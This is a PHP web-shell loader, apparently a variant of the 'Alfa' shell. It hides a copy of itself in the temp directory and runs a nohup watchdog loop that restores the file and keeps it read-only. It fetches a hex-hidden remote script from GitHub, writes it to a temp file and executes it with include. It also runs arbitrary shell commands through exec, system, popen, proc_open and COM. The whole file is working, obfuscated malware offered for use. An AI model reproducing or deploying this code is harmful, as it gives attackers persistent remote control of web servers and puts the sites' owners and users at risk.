<?php
$GLOBALS['oZgNypoPRU'] = array(
    'username' => '7htm',
    'password' => '2503cd7091fd55321ba7725fabcc5a04', //md5(ehsan)
    'safe_mode' => '1',
    'login_page' => '403',
    'show_icons' => '1',
    'post_encryption' => true,
    'cgi_api' => false,
);
$_t = SyS_GeT_tEmp_DiR();
if (!is_dir($_t . "/.sessions")) {
    mkdir($_t . "/.sessions");
}
if (!is_file($_t . '/.sessions/.-' . nameMad() . ".tmp")) {
    copy($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"], $_t . "/.sessions/.-" . nameMad() . ".tmp");
}
if (file_exists($_t . "/.sessions/.-" . nameMad() . ".tmp")) {
    $_F = $_t . "/.sessions/.-" . nameMad() . ".tmp";
    FiLe_PuT_CoNtEnTs($_t . "/.sessions/.-" . handlerName() . ".tmp", '
    <?php
while (True) {
    if (!file_exists("' . $_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"] . '")) {
        CoPy("' . $_F . '", "' . $_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"] . '");
    }
    if (FiLePeRmS("' . $_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"] . '") != "0444") {
        ChMoD("' . $_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"] . '", 0444);
    }
}
?>');
    if (isset($_GET['lock'])) {
        ChMoD($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"], 0444);
        _mad_cmd('sh -c "nohup $(nohup php ' . $_t . '/.sessions/.-' . handlerName() . '.tmp < /dev/null &) < /dev/null &"');
    }
}
function __fel_Api($url)
{
    if (function_exists("\x63\x75\x72\x6C\x5F\x65\x78\x65\x63")) {
        $conn = curl_init(${"\x75\x72\x6C"});
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, true);
        curl_setopt($conn, CURLOPT_FRESH_CONNECT,  true);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        $url_get_contents_data = (curl_exec($conn));
        curl_close($conn);
    } elseif (function_exists("\x66\x69\x6C\x65\x5F\x67\x65\x74\x5F\x63\x6F\x6E\x74\x65\x6E\x74\x73")) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists("\x66\x6F\x70\x65\x6E") && function_exists("\x73\x74\x72\x65\x61\x6D\x5F\x67\x65\x74\x5F\x63\x6F\x6E\x74\x65\x6E\x74\x73")) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents(${"\x68\x61\x6E\x64\x6C\x65"});
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}
$Array = [
    '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f72697a74726578782f68636b65722f6d61696e2f616c666f362e68636b',
    '697a74726578782f68636b65722f6d61696e2f616c666f2e68636b'

];
$hitung_array = count($Array);
for ($i = 0; $i < $hitung_array; $i++) {
    $fungsi[] = unhex($Array[$i]);
}
function unhex($y)
{
    $n = '';
    for ($i = 0; $i < strlen($y) - 1; $i += 2) {
        $n .= chr(hexdec($y[$i] . $y[$i + 1]));
    }
    return $n;
}
function hex($n)
{
    $y = '';
    for ($i = 0; $i < strlen($n); $i++) {
        $y .= dechex(ord($n[$i]));
    }
    return $y;
}

function nameMad()
{
    return "90125467239121912" . base64_encode(__DIR__);
}
function handlerName()
{
    return "901H0012121045689" . base64_encode(__DIR__);
}
function Psaux()
{
    return "87121271212717" . base64_encode(__DIR__);
}

function _mad_cmd($in, $re = false)
{
    $out = "";
    try {
        if ($re) $in = $in . "\x20\x32\x3E\x26\x31";
        if (function_exists("\x65\x78\x65\x63")) {
            @ExEc($in, $out);
            $out = @join("\n", $out);
        } elseif (function_exists("\x70\x61\x73\x73\x74\x68\x72\x75")) {
            ob_start();
            @PasSthRu($in);
            $out = ob_get_clean();
        } elseif (function_exists("\x73\x79\x73\x74\x65\x6D")) {
            ob_start();
            @SySteM($in);
            $out = ob_get_clean();
        } elseif (function_exists("\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63")) {
            $out = sHeLL_exEc($in);
        } elseif (function_exists("\x70\x6F\x70\x65\x6E") && function_exists("\x70\x63\x6C\x6F\x73\x65")) {
            if (is_resource($f = @pOpeN($in, "r"))) {
                $out = "";
                while (!@feof($f))
                    $out .= fread($f, 1024);
                pClose($f);
            }
        } elseif (function_exists("\x70\x72\x6F\x63\x5F\x6F\x70\x65\x6E")) {
            $pipes = array();
            $process = @proC_opeN($in . "\x20\x32\x3E\x26\x31", array(array("\x70\x69\x70\x65", "w"), array("\x70\x69\x70\x65", "w"), array("\x70\x69\x70\x65", "w")), $pipes, null);
            $out = @stream_Get_contEnts($pipes[1]);
        } elseif (class_exists("\x43\x4F\x4D")) {
            $alfaWs = new COM("\x57\x53\x63\x72\x69\x70\x74\x2E\x73\x68\x65\x6C\x6C");
            $exec = $alfaWs->eXeC("\x63\x6D\x64\x2E\x65\x78\x65\x20\x2F\x63\x20" . $_POST['alfa1']);
            $stdout = $exec->StdOut();
            $out = $stdout->ReadAll();
        }
    } catch (Exception $e) {
    }
    return $out;
}


function ____($_____)
{
    $_a = sYs_gEt_TeMp_dIr();
    $tmpfname = TeMpNaM($_a, "\x75\x6E\x69\x78\x2E\x31\x31");
    $handle = fOpEn($tmpfname, "w+");
    fWrItE($handle, "<?php " . $_____);
    FcLoSe($handle);
    include $tmpfname;
    array_map('unlink', glob($_a . "/*.11*"));
    return get_defined_vars();
}
$data = __fel_Api($fungsi[0]);
if ($data) {
    eXtRaCt(____($data));

}
